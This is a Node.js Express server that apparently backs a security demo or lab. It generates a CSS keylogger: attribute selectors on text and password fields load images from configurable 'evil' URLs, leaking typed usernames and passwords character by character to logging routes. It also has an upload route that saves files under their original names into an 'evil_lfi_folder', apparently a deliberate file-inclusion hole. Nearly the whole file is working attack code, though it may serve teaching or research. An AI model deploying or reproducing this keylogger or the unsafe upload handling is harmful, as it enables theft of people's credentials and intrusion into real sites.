const express = require("express");
const favicon = require("express-favicon");
const path = require("path");
const multer = require("multer");
const { v4: uuidv4 } = require("uuid");
const port = process.env.PORT || 8080;
const app = express();
const cssFilter = require("./cssFilter");
const evilFolder = path.join(__dirname, "build", "evil_lfi_folder/");
const evilUrl = process.env.EVIL_URL || "http://localhost:8080/log/";
const evilUrlUsername =
  process.env.EVIL_URL_USERNAME || "http://localhost:8080/log/username/";
const evilUrlPassword =
  process.env.EVIL_URL_PASSWORD || "http://localhost:8080/log/password/";

const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, evilFolder);
  },
  // By default, multer removes file extensions so let's add them back
  filename: function (req, file, cb) {
    cb(null, file.originalname);
  },
});

app.use(favicon(__dirname + "/build/favicon.ico"));
app.use(express.static(__dirname));
app.use(express.static(path.join(__dirname, "build")));

app.get("/ping", function (req, res) {
  return res.send("pong");
});

app.get("/log/:key", function (req, res) {
  res.setHeader(
    "cache-control",
    "private, no-cache, no-store, must-revalidate"
  );
  res.setHeader("Expires", 0);
  res.setHeader("pragma", "no-cache");
  res.setHeader("Etag", uuidv4());
  res.sendStatus(400);
});

app.get("/log/username/:key", function (req, res) {
  res.setHeader(
    "Cache-Control",
    "private, no-cache, no-store, must-revalidate"
  );
  res.setHeader("Expires", 0);
  res.setHeader("pragma", "no-cache");
  res.send(req.params.key);
});

app.get("/log/password/:key", function (req, res) {
  res.setHeader(
    "Cache-Control",
    "private, no-cache, no-store, must-revalidate"
  );
  res.setHeader("Expires", 0);
  res.setHeader("pragma", "no-cache");
  res.send(req.params.key);
});

app.post("/development", (req, res) => {
  let upload = multer({
    storage: storage,
    fileFilter: cssFilter.cssFilter,
  }).single("css");

  upload(req, res, function (err) {
    console.log(req)
    console.log(__dirname)
    if (req.fileValidationError) {
      return res.send(req.fileValidationError);
    } else if (!req.file) {
      return res.send("Please upload an css file");
    } else if (err instanceof multer.MulterError) {
      return res.send(err);
    } else if (err) {
      return res.send(err);
    }
    res.send(req.file.path);
  });
});

// https://github.com/Cyral/CSS-Keylogger
app.get("/bad.css", (req, res) => {
  res.header("Content-Type", "text/css");
  res.send(createCSS(req.query.length));
});

function createCSS(l) {
  let css = "";
  const values = [];
  const length = typeof l === "undefined" ? 1 : parseInt(l);
  // Create an array of all the characters we want to log.
  for (let i = 32; i < 127; i++) {
    let value = String.fromCharCode(i);
    const urlValue = encodeURIComponent(value); // The URL characters must be escaped.

    if (value === `"`) value = `\\"`;
    if (value === `\\`) value = `\\\\`;
    values.push({ css: value, url: urlValue });
  }

  values.forEach((v1) => {
    css += `input[type="text"][value$="${v1.css}"] { background-image: url("${evilUrlUsername}${v1.url}") !important }\n`;
    css += `input[type="password"][value$="${v1.css}"] { background-image: url("${evilUrlPassword}${v1.url}") !important }\n`;
    if (length >= 2) {
      values.forEach((v2) => {
        css += `input[type="text"][value$="${
          v1.css + v2.css
        }"] { background-image: url("${evilUrlUsername}${
          v1.url + v2.url
        }") !important }\n`;
        css += `input[type="password"][value$="${
          v1.css + v2.css
        }"] { background-image: url("${evilUrlPassword}${
          v1.url + v2.url
        }") !important }\n`;
        if (length >= 3) {
          values.forEach((v3) => {
            css += `input[type="text"][value$="${
              v1.css + v2.css + v3.css
            }"] { background-image: url("${evilUrlUsername}${
              v1.url + v2.url + v3.url
            }") !important }\n`;
            css += `input[type="password"][value$="${
              v1.css + v2.css + v3.css
            }"] { background-image: url("${evilUrlPassword}${
              v1.url + v2.url + v3.url
            }") !important }\n`;
            if (length >= 4) {
              values.forEach((v4) => {
                css += `input[type="text"][value$="${
                  v1.css + v2.css + v3.css + v4.css
                }"] { background-image: url("${evilUrlUsername}${
                  v1.url + v2.url + v3.url + v4.url
                }") !important }\n`;
                css += `input[type="password"][value$="${
                  v1.css + v2.css + v3.css + v4.css
                }"] { background-image: url("${evilUrlPassword}${
                  v1.url + v2.url + v3.url + v4.url
                }") !important }\n`;
              });
            }
          });
        }
      });
    }
  });
  return css;
}

app.get("/*", function (req, res) {
  res.sendFile(path.join(__dirname, "build", "index.html"));
});

app.listen(port, () => console.log(`Server is running at ${port}`));
